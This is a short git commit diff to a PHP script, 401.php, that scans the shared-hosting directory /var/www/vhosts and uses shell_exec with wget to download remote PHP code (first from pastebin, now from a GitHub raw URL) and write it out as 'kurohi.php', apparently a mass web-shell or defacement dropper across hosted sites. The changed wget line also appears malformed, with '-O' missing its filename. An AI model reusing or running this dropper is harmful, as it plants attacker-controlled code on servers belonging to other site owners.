a017bc8f4ce2d09c02c863576ca258a81c0ea191
id33}{plCrw <90143175+id33xc@users.noreply.github.com>
2022-02-23 01:28:35 +0700

    Update 401.php

--- 401.php
+++ 401.php
@@ -5,7 +5,7 @@ $root = '/var/www/vhosts';
 $scan = scandir($root);
 
 $n = 'kurohi.php';
-$isi = shell_exec('wget https://pastebin.com/raw/M78s8viE -O'.$n);
+$isi = shell_exec('wget https://raw.githubusercontent.com/id33xc/sc/main/fw.php -O');
 
 $bikin = fopen($n, "w");
 		 fwrite($bikin, $isi);
